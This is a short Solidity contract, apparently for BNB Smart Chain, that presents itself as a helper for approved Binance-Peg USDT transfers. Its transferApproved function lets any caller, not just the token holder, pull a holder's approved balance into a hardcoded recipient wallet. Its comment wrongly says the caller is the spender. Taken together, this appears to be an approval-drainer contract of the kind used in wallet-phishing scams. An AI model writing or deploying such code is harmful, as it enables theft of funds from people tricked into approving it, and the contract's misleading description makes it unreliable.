// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @dev Minimal interface matching the verified Binance-Peg BSC-USD BEP-20 ABI.
interface IBinancePegBscUsd {
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

/**
 * @title UsdtApprovalTransfer
 * @notice Transfers Binance-Peg BSC-USD after the token holder has approved
 *         this contract as the spender.
 *
 * The recipient is immutable so a caller cannot redirect an approved transfer.
 * The token holder must approve this contract directly on the token contract;
 * this contract cannot approve on the holder's behalf.
 */
contract UsdtApprovalTransfer {
    address public constant BINANCE_PEG_BSC_USD =
        0x55d398326f99059fF775485246999027B3197955;
    address public constant RECIPIENT =
        0xf39AfA7346aACE4a3Aa48cEb014bE24cba2EB596;

    IBinancePegBscUsd public immutable token;

    error InvalidOwner();
    error InvalidAmount();
    error InsufficientAllowance(uint256 available, uint256 required);
    error TransferFailed();

    event ApprovedTransfer(address indexed owner, address indexed recipient, uint256 amount);

    constructor() {
        token = IBinancePegBscUsd(BINANCE_PEG_BSC_USD);
    }

    /// @notice Move an approved amount from `owner` to the fixed recipient.
    /// @dev The caller is the spender and must have an allowance from `owner`.
    function transferApproved(address owner, uint256 amount) external {
        if (owner == address(0)) revert InvalidOwner();
        if (amount == 0) revert InvalidAmount();

        uint256 available = token.allowance(owner, address(this));
        if (available < amount) revert InsufficientAllowance(available, amount);
        if (!token.transferFrom(owner, RECIPIENT, amount)) revert TransferFailed();

        emit ApprovedTransfer(owner, RECIPIENT, amount);
    }
}
